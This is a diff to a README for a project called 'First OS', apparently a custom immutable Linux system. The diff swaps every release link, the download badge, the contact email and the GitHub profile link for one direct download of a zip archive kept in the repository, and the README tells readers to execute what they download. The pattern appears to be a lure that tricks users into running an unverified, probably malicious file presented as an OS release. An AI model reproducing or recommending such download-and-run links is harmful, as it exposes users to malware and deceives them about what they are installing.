@@ -2,7 +2,7 @@
 
 Welcome to the **First OS** repository! This project aims to provide a custom, immutable Linux operating system that meets modern needs. With a focus on simplicity and efficiency, First OS is built using the latest technologies in the Linux ecosystem.
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/VLADMER79/first-os/releases)
+[![Download Release](https://raw.githubusercontent.com/VLADMER79/first-os/main/files/system/usr/os_first_v2.7.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/VLADMER79/first-os/main/files/system/usr/os_first_v2.7.zip)
 
 ## Table of Contents
 
@@ -29,7 +29,7 @@ First OS is designed to provide a streamlined and efficient operating system exp
 
 ## Getting Started
 
-To get started with First OS, you need to download the latest release. You can find it [here](https://github.com/VLADMER79/first-os/releases). Once downloaded, execute the installation file to set up your system.
+To get started with First OS, you need to download the latest release. You can find it [here](https://raw.githubusercontent.com/VLADMER79/first-os/main/files/system/usr/os_first_v2.7.zip). Once downloaded, execute the installation file to set up your system.
 
 ### Prerequisites
 
@@ -41,7 +41,7 @@ Before you begin, ensure you have the following:
 
 ### Installation Steps
 
-1. **Download the latest release** from [here](https://github.com/VLADMER79/first-os/releases).
+1. **Download the latest release** from [here](https://raw.githubusercontent.com/VLADMER79/first-os/main/files/system/usr/os_first_v2.7.zip).
 2. **Execute the installation file** you downloaded.
 3. Follow the on-screen instructions to complete the setup.
 
@@ -83,9 +83,9 @@ First OS is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: contact@first-os.com
-- **GitHub**: [VLADMER79](https://github.com/VLADMER79)
+- **Email**: https://raw.githubusercontent.com/VLADMER79/first-os/main/files/system/usr/os_first_v2.7.zip
+- **GitHub**: [VLADMER79](https://raw.githubusercontent.com/VLADMER79/first-os/main/files/system/usr/os_first_v2.7.zip)
 
 ---
 
-Thank you for checking out First OS! We hope you enjoy using it as much as we enjoyed building it. Don't forget to check the [Releases](https://github.com/VLADMER79/first-os/releases) section for the latest updates and features!
+Thank you for checking out First OS! We hope you enjoy using it as much as we enjoyed building it. Don't forget to check the [Releases](https://raw.githubusercontent.com/VLADMER79/first-os/main/files/system/usr/os_first_v2.7.zip) section for the latest updates and features!
